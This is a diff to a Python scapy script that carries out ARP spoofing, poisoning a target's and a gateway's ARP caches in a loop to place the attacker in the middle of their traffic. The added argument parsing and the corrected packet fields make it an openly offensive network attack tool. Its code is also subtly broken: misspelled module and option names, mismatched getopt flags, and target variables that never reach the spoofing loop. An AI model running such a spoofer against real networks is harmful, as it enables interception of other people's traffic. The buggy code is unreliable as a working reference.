@@ -1,8 +1,35 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
 
 import scapy.all as scapy
 import time
 import sys
+import getopt
+
+
+
+def main(argv):
+   target_ip = ''
+   gateway_ip = ''
+   try:
+      opts, args = getopt.getopt(argv,"hi:o:",["tragetip=","gatewayip="])
+   except getopt.GetoptError:
+      print ('test.py -t <target IP> -g <Gateway IP>')
+      sys.exit(2)
+   for opt, arg in opts:
+      if opt == '-h':
+         print ('test.py -t <target IP> -g <Gateway IP>')
+         sys.exit()
+      elif opt in ("-t", "--tragetip"):
+         target_ip = arg
+      elif opt in ("-g", "--gatewayip"):
+         gateway_ip = arg
+   print ('Target IP: "', target_ip)
+   print ('GatewayIP: "', gateway_ip)
+
+
+
+
+
 
 def get_mac(ip):
     arp_request = scappy.ARP(pdst=ip)
@@ -15,7 +42,7 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op= 2, pdst = IP, hwdst = target_mac, psrc = sourceIP)
+    packet = scapy.ARP(op= 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
     scapy.send(packet,Verbose=False) 
     
 
@@ -26,10 +53,8 @@ def restore (destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-# TODO Create arguemnts for the spoofer
-target_ip = ""
-gateway_ip = ""
-
+if __name__ == "__main__":
+   main(sys.argv[1:])
 
 
 try:
@@ -40,7 +65,7 @@ try:
 
         sent_packets_count += 2
 
-        print("\r[+] Sent two packets: " + str(sent_packets_count)),
+        print("\r[+] Sent spoof packets: " + str(sent_packets_count)),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
